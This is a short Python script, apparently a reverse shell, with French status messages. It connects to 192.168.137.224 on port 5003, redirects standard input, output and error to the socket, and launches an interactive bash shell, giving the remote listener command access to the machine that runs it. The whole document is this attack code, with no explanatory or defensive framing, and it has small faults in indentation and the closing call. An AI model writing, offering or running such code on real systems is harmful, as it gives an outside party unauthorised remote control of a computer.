from os import dup2

 from subprocess import run

 import socket

 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

 try:

    s.connect(("192.168.137.224", 5003))

    print("essaie de connexion reverse shell reussie!!!!")

    dup2(s.fileno(), 0)

    dup2(s.fileno(), 1)

    dup2(s.fileno(), 2)

    run(["/bin/bash", "-i"])

 except ConnectionRefusedError:

             print("Connexion réfusée")

 finally:

            socket.close()
